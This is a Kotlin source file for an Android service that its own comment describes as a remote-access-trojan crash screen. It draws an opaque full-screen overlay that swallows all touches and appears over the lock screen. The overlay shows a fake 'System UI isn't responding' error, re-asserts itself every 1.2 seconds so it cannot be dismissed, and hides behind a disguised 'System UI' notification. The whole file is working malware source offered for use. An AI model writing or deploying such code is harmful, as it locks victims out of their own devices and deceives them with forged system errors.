package com.sync.xxx

import android.app.*
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat

/**
 * Brutal crash / freeze screen.
 * Full black overlay + fake system error text that stays on top.
 * Only removable via RAT unlock / crashStop command.
 */
class CrashScreenService : Service() {

    companion object {
        const val CHANNEL_ID = "crash_ch"
        const val NOTIF_ID = 8843
        @Volatile var running = false
    }

    private var wm: WindowManager? = null
    private var root: FrameLayout? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        running = true
        showCrash()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        removeOverlay()
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_LOW)
            ch.setSound(null, null)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    private fun buildNotif(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System UI")
            .setSmallIcon(android.R.drawable.stat_notify_error)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun showCrash() {
        handler.post {
            try {
                wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.OPAQUE
                )
                params.gravity = Gravity.TOP or Gravity.START

                root = FrameLayout(this).apply {
                    setBackgroundColor(Color.BLACK)
                    isClickable = true
                    // swallow all touches
                    setOnTouchListener { _, _ -> true }
                }

                val msg = TextView(this).apply {
                    text = "System UI isn't responding\n\nClose app  ·  Wait\n\n[Process system crashed]\nError code: 0xC000021A"
                    setTextColor(Color.WHITE)
                    textSize = 16f
                    gravity = Gravity.CENTER
                    setPadding(48, 48, 48, 48)
                }
                root?.addView(msg, FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.MATCH_PARENT
                ))

                wm?.addView(root, params)

                // re-assert on top every 1.2s (anti-dismiss)
                handler.post(object : Runnable {
                    override fun run() {
                        if (!running) return
                        try {
                            root?.let {
                                params.flags = params.flags or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                                wm?.updateViewLayout(it, params)
                            }
                        } catch (_: Exception) {}
                        handler.postDelayed(this, 1200)
                    }
                })
            } catch (e: Exception) {
                Log.e("CrashScreen", "show: ${e.message}")
            }
        }
    }

    private fun removeOverlay() {
        try { root?.let { wm?.removeView(it) } } catch (_: Exception) {}
        root = null
        wm = null
    }
}
